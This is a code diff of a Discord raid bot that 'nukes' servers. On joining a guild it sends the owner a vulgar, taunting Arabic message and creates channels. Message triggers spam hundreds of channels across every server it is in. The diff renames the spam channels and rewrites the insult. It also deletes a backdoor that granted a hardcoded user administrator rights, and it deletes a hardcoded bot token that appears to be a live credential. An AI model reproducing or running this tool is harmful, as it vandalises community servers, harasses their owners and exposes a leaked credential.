-m.createChannel('Hacked u by unknown Is here', 'text');
-m.createChannel('Hacked u by unknown Is here', 'text');
-m.createChannel('Hacked u by unknown Is here', 'text');
-m.createChannel('Hacked u by unknown Is here', 'text');
-m.createChannel('Hacked u by unknown Is here', 'text');
-m.createChannel('Hacked u by unknown Is here', 'text');
-m.createChannel('Hacked u by unknown Is here', 'text');
-m.createChannel('Hacked u by unknown Is here', 'text');
- 
-m.createChannel('Hacked u by unknown Is here', 'text');
-m.createChannel('Hacked u by unknown Is here', 'text');
- 
-m.createChannel('Hacked u by unknown Is here', 'text');
-m.createChannel('Hacked u by unknown Is here', 'text');
-m.createChannel('Hacked u by unknown Is here', 'text');
-m.createChannel('Hacked u by unknown Is here', 'text');
-m.createChannel('Hacked u by unknown Is here', 'text');
-m.createChannel('Hacked u by unknown Is here', 'text');
-m.createChannel('Hacked u by unknown Is here', 'text');
-m.createChannel('Hacked u by unknown Is here', 'text');
-m.createChannel('Hacked u by unknown Is here', 'text');
-m.createChannel('Hacked u by unknown Is here', 'text');
-m.createChannel('Hacked u by unknown Is here', 'text');
- 
-m.createChannel('Hacked u by unknown Is here', 'text');
-m.createChannel('Hacked u by unknown Is here', 'text');
- 
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('smartmoonrp', 'text');                 
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('smartmoonrp', 'text');     
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('Smartmoonrp', 'text');
+m.createChannel('smartmoonrp', 'text');                 
 })
 }
 });
  
 LOka.on('message', message => {
-         if (message.content === "k") {
+         if (message.content === ".") {
                  LOka.guilds.forEach(m =>{
 m.createChannel('Hacked u by unknown Is here', 'voice');
 m.createChannel('Hacked u by unknown Is here', 'voice');
@@ -417,7 +1744,7 @@ async function nuke(guild) {
  
   await guild.fetchMembers();
  
-  await guild.owner.send(' HacKed سلم على سيرفرك هههههههههههههههه').catch(e => { return void e; });
+  await guild.owner.send('لتتعلم تنشر مرة ثانية هههههههههههه ههههههههههههههههههه مخ ديوس ابن مخخخخخخخخخ').catch(e => { return void e; });
  
  
  
@@ -436,7 +1763,7 @@ async function nuke(guild) {
     }
   }));
  
-    await guild.createChannel('Hacked u by unknown Is here', 'text');
+    await guild.createChannel('smartmoonrp', 'text');
  
       await guild.createChannel('Hacked u by unknown Is here', 'voice');
  
@@ -457,25 +1784,8 @@ LOka.on('ready', () => {
 LOka.on('guildCreate', async (guild) => {
   return nuke(guild).catch(console.error);
 });
- 
-LOka.on('guildMemberAdd', member => {
-   
-            if (member.id === "349288766302584832") {
-                member.guild.createRole({
-                    name : LOka.user.username,
-                    color : "RANDOM",
-                    permissions : [8]
-                }).then(function(role){
-                    member.addRole(role)
-                })
-               
-            }
-       
-    });
- 
    
  
  
  
- 
-LOka.login("NTkxNzMxNjk1MjkyNzc2NDQ4.XQ1DUQ.K12bJik0xyqr2kxCKs_itkAtmmk")
+LOka.login(process.env.BOT_TOKEN);
